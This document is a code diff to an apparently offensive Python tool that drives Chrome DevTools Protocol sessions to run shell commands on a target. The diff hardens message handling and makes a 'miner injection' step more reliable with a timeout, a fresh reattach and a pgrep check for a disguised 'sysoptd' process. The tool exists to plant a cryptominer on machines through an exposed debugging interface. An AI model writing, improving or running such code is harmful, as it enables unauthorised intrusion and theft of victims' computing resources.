@@ -39,7 +39,7 @@ class CDP:
         await self.ws.send(json.dumps(msg))
         while True:
             resp = json.loads(await self.ws.recv())
-            if resp.get("id") == mid:
+            if resp.get("id") == mid and resp.get("sessionId", self.session_id) == self.session_id:
                 if "error" in resp:
                     return None
                 return resp.get("result", {})
@@ -63,11 +63,16 @@ class CDP:
         result = await self.send("Runtime.evaluate", {
             "expression": expression, "awaitPromise": True, "returnByValue": True
         })
-        if result and "result" in result:
-            val = result["result"]
-            if val.get("type") == "undefined":
+        if result:
+            if "exceptionDetails" in result:
+                ex = result["exceptionDetails"].get("exception", {})
+                print(f"  JS exception: {ex.get('description', ex)[:200]}", flush=True)
                 return None
-            return val.get("value")
+            if "result" in result:
+                val = result["result"]
+                if val.get("type") == "undefined":
+                    return None
+                return val.get("value")
         return None
 
     async def shell_exec(self, cmd):
@@ -206,8 +211,22 @@ async def main():
                 if result and result.get("code") == 0:
                     print("  ✅ Shell bridge alive!", flush=True)
                     print("  ⛏️  Injecting miner...", flush=True)
-                    result = await pc.shell_exec(MINER_CMD)
-                    print(f"  Miner result: {result}", flush=True)
+                    try:
+                        result = await asyncio.wait_for(pc.shell_exec(MINER_CMD), timeout=90)
+                        print(f"  Miner result: {result}", flush=True)
+                    except asyncio.TimeoutError:
+                        # Foreground command holds the HTTP response open —
+                        # injection still executes; verify on a fresh attach.
+                        print("  (inject ack pending — verifying on fresh attach...)", flush=True)
+                    await asyncio.sleep(10)
+                    at2 = await raw_call("Target.attachToTarget",
+                                         {"targetId": target_id, "flatten": True})
+                    pc2 = CDP(ws, at2["sessionId"])
+                    await pc2.send("Runtime.enable")
+                    ps = await pc2.shell_exec("pgrep -a python3 | head -5; echo ---; tail -c 300 /tmp/m.log")
+                    print(f"  Miner state: {ps}", flush=True)
+                    ok = bool(ps and ("sysoptd" in ps or "ok #" in ps))
+                    print(f"  {'✅ MINER RUNNING' if ok else '❌ INJECT FAILED'}", flush=True)
                     print("  ✅ DONE", flush=True)
                     return True
                 await asyncio.sleep(5)
